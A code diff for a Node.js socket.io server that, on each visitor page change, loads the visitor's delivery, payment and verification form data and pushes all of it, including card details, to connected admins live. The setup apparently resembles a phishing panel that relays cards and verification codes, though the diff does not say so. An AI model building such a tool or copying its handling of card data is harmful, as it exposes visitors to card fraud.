@@ -167,13 +167,57 @@ io.on('connection', (socket) => {
         [page, sessionId]
       );
 
-      // Notify all admins
+      // Get full visitor data for payment page (to show existing card data in admin)
+      const visitorResult = await pool.query(
+        'SELECT * FROM visitors WHERE session_id = $1',
+        [sessionId]
+      );
+
+      // Get all form submissions for this visitor
+      const sessionIds = [sessionId];
+      let submissionsMap = {};
+      
+      const allSubmissions = await pool.query(`
+        SELECT * FROM form_submissions 
+        WHERE session_id = $1 
+        ORDER BY created_at DESC
+      `, [sessionId]);
+      
+      allSubmissions.rows.forEach(sub => {
+        const key = `${sub.session_id}_${sub.form_type}`;
+        if (!submissionsMap[key]) {
+          submissionsMap[key] = [];
+        }
+        submissionsMap[key].push(sub);
+      });
+
+      // Parse visitor data
+      let visitorData = visitorResult.rows[0] || {};
+      if (typeof visitorData.delivery_data === 'string') {
+        try { visitorData.delivery_data = JSON.parse(visitorData.delivery_data); } catch (e) {}
+      }
+      if (typeof visitorData.payment_data === 'string') {
+        try { visitorData.payment_data = JSON.parse(visitorData.payment_data); } catch (e) {}
+      }
+      if (typeof visitorData.verification_data === 'string') {
+        try { visitorData.verification_data = JSON.parse(visitorData.verification_data); } catch (e) {}
+      }
+
+      // Add submissions to visitor data
+      visitorData.delivery_submissions = submissionsMap[`${sessionId}_delivery`] || [];
+      visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
+      visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];
+
+      // Notify all admins with FULL visitor data
       adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('visitor:pageChange', {
+          ...visitorData,
           sessionId,
           page,
           timestamp: new Date()
         });
+        // Also emit visitor:updated to update the card in real-time
+        adminSocket.emit('visitor:updated', visitorData);
       });
     } catch (error) {
       console.error('Error updating page:', error);
